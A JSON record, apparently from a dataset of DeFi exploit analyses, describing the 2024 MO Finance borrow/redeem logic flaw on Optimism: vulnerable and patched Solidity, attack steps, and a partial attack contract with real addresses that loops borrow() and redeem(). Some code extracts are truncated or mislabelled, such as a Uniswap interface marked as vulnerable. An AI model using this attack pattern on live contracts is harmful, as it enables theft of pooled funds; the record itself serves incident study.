@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-03-XX_MO_BorrowRedeemLogicFlaw",
+ "source_file": "2024/2024-03-XX_MO_BorrowRedeemLogicFlaw.md",
+ "title": "MO — Repeated borrow/redeem Business Logic Flaw Analysis",
+ "date": "2024-03-01",
+ "protocol": "MO Finance",
+ "chain": "Optimism",
+ "loss_raw": "~$413,000",
+ "loss_usd": 413000.0,
+ "root_cause": "`Loan.borrow()` can be called repeatedly without proper collateral or duplicate borrow validation, and `redeem()` executes without position validity checks, draining LP liquidity",
+ "attack_tx": null,
+ "vulnerable_contract": "Loan 0xAe7b6514",
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no restriction on repeated borrow/redeem calls\ninterface ILoan {\n    function borrow(uint256 amount) external;\n    function redeem(uint256 positionId) external;\n}\n\n// borrow(): allows repeated borrowing without collateral or with insufficient collateral\nfunction borrow(uint256 amount) external {\n    // No validation against repeated borrow within the same TX\n    // Insufficient collateral ratio validation\n    positions[msg.sender].push(Position(amount, block.timestamp));\n    token.transfer(msg.sender, amount);\n}\n\n// redeem(): only checks whether the position exists\nfunction redeem(uint256 positionId) external {\n    Position memory pos = positions[msg.sender][positionId];\n    require(pos.amount > 0, \"no position\");\n    delete positions[msg.sender][positionId];\n    // Immediate liquidation with no additional validation\n}\n\n//",
+  "// File: Loan.sol\n    function redeem(uint256 index) public {  // ❌ Vulnerability\n        BorrowOrder storage order = borrowOrders[msg.sender][index];\n        if (order.amount == 0) revert InvalidIndex();\n        if (order.duration != 0 && block.timestamp < order.expiredTime) revert NotExpired();\n        if (order.finished == true) revert Finished();\n\n        uint256 intere = interest(msg.sender, index);\n        uint256 amount = (order.amount * redeemRate) / BASE;\n\n        IApproveProxy(approveProxy).claim(\n            supplyToken,\n            msg.sender,\n            address(this),\n            order.total + intere\n        );\n        IERC20(borrowToken).safeTransfer(msg.sender, amount);\n        order.finished = true;\n\n        emit BorrowOrderFinished(msg.sender, index, amount, intere);\n    }",
+  "// File: IUniswapV2Router.sol\n    function addLiquidity(  // ❌ Vulnerability\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n\n    function removeLiquidityWithPermit(\n        address tokenA,"
+ ],
+ "code_after": [
+  "✅ Safe code: collateral ratio validation + cooldown\nmapping(address => uint256) public lastBorrowBlock;\n\nfunction borrow(uint256 amount) external {\n    require(block.number > lastBorrowBlock[msg.sender] + BORROW_COOLDOWN, \"cooldown\");\n    require(getCollateralRatio(msg.sender) >= MIN_COLLATERAL_RATIO, \"insufficient collateral\");\n    lastBorrowBlock[msg.sender] = block.number;\n    positions[msg.sender].push(Position(amount, block.timestamp));\n    token.transfer(msg.sender, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] Deploy intermediary contract (manages token approvals)",
+  "→ [2] Loop: repeated borrow() calls",
+  "→ [3] Immediately redeem() each position",
+  "→ [4] Swap accumulated MO → USDT (UniV2)",
+  "→ [5] ~$413K USDT profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Deploy intermediary contract (manages token approvals)\n  │\n  ├─→ [2] Loop: repeated borrow() calls\n  │         └─ Receives MO tokens without collateral validation\n  │\n  ├─→ [3] Immediately redeem() each position\n  │         └─ Liquidate positions to acquire additional assets\n  │\n  ├─→ [4] Swap accumulated MO → USDT (UniV2)\n  │\n  └─→ [5] ~$413K USDT profit",
+  "interface ILoan {\n    function borrow(uint256 amount) external;\n    function redeem(uint256 positionId) external;\n}\n\ninterface IRelation {\n    function register(address referrer) external;\n}\n\ncontract AttackContract {\n    ILoan    constant loan     = ILoan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);\n    IERC20   constant MO       = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1);\n    IERC20   constant USDT     = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);\n    IUniRouter constant router = IUniRouter(0x9eADD135641f8b8cC4E060D33d63F8245f42bE59);\n\n    function testExploit() external {\n        // [1] Repeated borrow/redeem loop\n        for (uint i = 0; i < 100; i++) {\n            loan.borrow(borrowAmount);\n            loan.redeem(i);\n        }\n\n        // [2] Swap accumulated MO → U"
+ ]
+}
